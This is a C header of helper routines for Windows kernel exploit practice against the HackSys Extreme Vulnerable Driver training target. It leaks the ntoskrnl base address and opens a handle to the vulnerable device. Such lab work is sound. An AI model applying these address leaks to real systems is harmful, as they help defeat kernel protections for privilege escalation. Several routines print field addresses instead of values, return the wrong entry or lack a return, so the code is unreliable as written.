#pragma once
#include<Windows.h>
#include<stdio.h>
#include<Psapi.h>
#include<string.h>

INT_PTR Use_EnumDeviceDriver()
{
	LPVOID addresses[1000];
	DWORD needed;

	EnumDeviceDrivers(addresses, 1000, &needed);
	LPVOID ntoskrnl_addr = addresses[0];

	printf("\n\t[+] Address of NT Base : 0x%p\n", ntoskrnl_addr);

	return 0;
}

#define MAXIMUM_FILENAME_LENGTH 255 
typedef struct SYSTEM_MODULE_INFORMATION_ENTRY {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {

	ULONG NumberOfModules;
	SYSTEM_MODULE_INFORMATION_ENTRY Modules[1];

} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemModuleInformation = 11,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
}SYSTEM_INFORMATION_CLASS;

/*
__kernel_entry NTSTATUS NtQuerySystemInformation(
  IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
  OUT PVOID                   SystemInformation,
  IN ULONG                    SystemInformationLength,
  OUT PULONG                  ReturnLength
);
*/

typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

PSYSTEM_MODULE_INFORMATION_ENTRY GetKernelBase_By_NtQuerySystemInformation()
{
	HMODULE ntdll = GetModuleHandle("ntdll");
	if (ntdll == NULL)
	{
		printf("[-] Failed to get handle to NTDLL.dll");
		exit(-1);
	}

	PNtQuerySystemInformation NtQuerySystemInformation_Addr = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (NtQuerySystemInformation_Addr == NULL)
	{
		printf("[-] Failed to get address of NtQuerySystemInformation : GetProcAddress Failed");
	}

	ULONG retLength;
	NtQuerySystemInformation_Addr(SystemModuleInformation, NULL, 0, &retLength);

	PSYSTEM_MODULE_INFORMATION ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, retLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo)
	{
		printf("[-] Failed to allocate memory for ModuleInfo : VirtualAlloc");
	}

	NtQuerySystemInformation_Addr(SystemModuleInformation, ModuleInfo, retLength, &retLength);
	
	printf("[+] Address of ntoskrnl.exe at 0x%p\n", &ModuleInfo->Modules[0].ImageBase);
	
	
	for (int i = 0; i < ModuleInfo->NumberOfModules; i++)
	{
		const char* ModuleFound = (const char*) (ModuleInfo->Modules[i].FullPathName + ModuleInfo->Modules[i].OffsetToFileName);
		if (strstr(ModuleFound,"ntoskrnl.exe") != 0) {
			printf("[+] Found ntoskrnl.exe base at : %d\n",i);
			printf("[+] Module : %s\n", &ModuleInfo->Modules[i].FullPathName);
			printf("[+] Offset of  Module : 0x%p\n", &ModuleInfo->Modules[i].OffsetToFileName);
			printf("[+] Address of Module : 0x%p\n\n", &ModuleInfo->Modules[i].ImageBase);
			return &ModuleInfo->Modules[0];
			
		}
	}
	printf("[-] Failed to Get kernelbase by NtQuerySystemInformation.....Exiting");
}




HANDLE open_device()
{
	printf("\n[?] Trying to get handle to device\n");

	LPCSTR lpFileName = "\\\\.\\HackSysExtremeVulnerableDriver";			
	DWORD dwDesiredAccess = GENERIC_READ | GENERIC_WRITE;
	DWORD dwShareMode = FILE_SHARE_READ | FILE_SHARE_WRITE;
	LPSECURITY_ATTRIBUTES lpSecurityAttributes = NULL;
	DWORD dwCreationDisposition = OPEN_EXISTING;
	DWORD dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL;
	HANDLE hTemplateFile = NULL;

	HANDLE hDevice = CreateFileA(lpFileName,
		dwDesiredAccess,
		dwShareMode,
		lpSecurityAttributes,
		dwCreationDisposition,
		dwFlagsAndAttributes,
		hTemplateFile
	);

	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("\t[-] Failed to get Handle to device!\n");
		system("pause");
		exit(0);
	}

	printf("\t[+] Got handle to device: 0x%X\n\n", hDevice);
	return hDevice;
}